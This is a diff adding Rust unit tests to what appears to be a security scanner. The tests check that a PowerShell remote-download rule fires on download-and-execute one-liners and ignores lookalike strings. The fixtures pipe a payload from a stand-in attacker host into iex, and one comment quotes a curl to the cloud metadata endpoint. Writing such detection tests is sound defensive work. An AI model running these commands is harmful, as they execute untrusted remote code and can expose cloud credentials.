@@ -807,6 +807,49 @@ mod tests {
         );
     }
 
+    /// Contract: PowerShell download aliases that retrieve executable
+    /// payloads are artifact findings, not only graph-level network edges.
+    #[test]
+    fn analyze_script_detects_powershell_remote_download_aliases() {
+        let path = std::path::Path::new("/pkg/bootstrap.ps1");
+        let service = ArtifactOrchestratorService::new();
+
+        for content in [
+            "iwr https://attacker.example/payload.ps1 | iex\n",
+            "irm(https://attacker.example/payload.ps1) | iex\n",
+            "Invoke-RestMethod https://attacker.example/payload.ps1 | iex\n",
+        ] {
+            let findings = analyze_script(&service, path, content);
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.rule_id == "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD"),
+                "PowerShell download alias must fire SCRIPT_POWERSHELL_REMOTE_DOWNLOAD for {content:?}; got {findings:?}",
+            );
+        }
+    }
+
+    /// Contract (negative): alias lookalikes do not produce PowerShell
+    /// remote-download findings just because they contain `iwr` or `irm`.
+    #[test]
+    fn analyze_script_rejects_powershell_remote_download_alias_substrings() {
+        let path = std::path::Path::new("/pkg/bootstrap.ps1");
+        let service = ArtifactOrchestratorService::new();
+
+        for content in [
+            "kiwr https://attacker.example/payload.ps1 | iex\n",
+            "confirm(https://attacker.example/payload.ps1) | iex\n",
+        ] {
+            let findings = analyze_script(&service, path, content);
+            assert!(
+                !findings
+                    .iter()
+                    .any(|f| f.rule_id == "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD"),
+                "lookalike alias must not fire SCRIPT_POWERSHELL_REMOTE_DOWNLOAD for {content:?}; got {findings:?}",
+            );
+        }
+    }
+
     /// Contract: a `# was: curl 169.254.169.254/latest/meta-data` comment
     /// in a shell script MUST NOT fire `METADATA_SERVICE_ACCESS` (or any
     /// internal-network rule) coming out of `permission_and_network_findings`.
